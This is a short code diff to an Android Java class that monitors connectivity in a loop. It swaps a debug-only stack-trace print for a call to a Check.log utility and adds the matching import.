@@ -16,6 +16,7 @@ import android.net.NetworkInfo;
 import com.android.service.Connectivity;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
 // Falso broadcast, e' generato da noi
 public class BroadcastMonitorConnectivity extends Thread {
@@ -49,7 +50,7 @@ public class BroadcastMonitorConnectivity extends Thread {
 			try {
 				wait(period);
 			} catch (InterruptedException e) {
-				if(Cfg.DEBUG) { e.printStackTrace(); }
+				if(Cfg.DEBUG) { Check.log(e); }
 			}
 		} while (true);
 	}
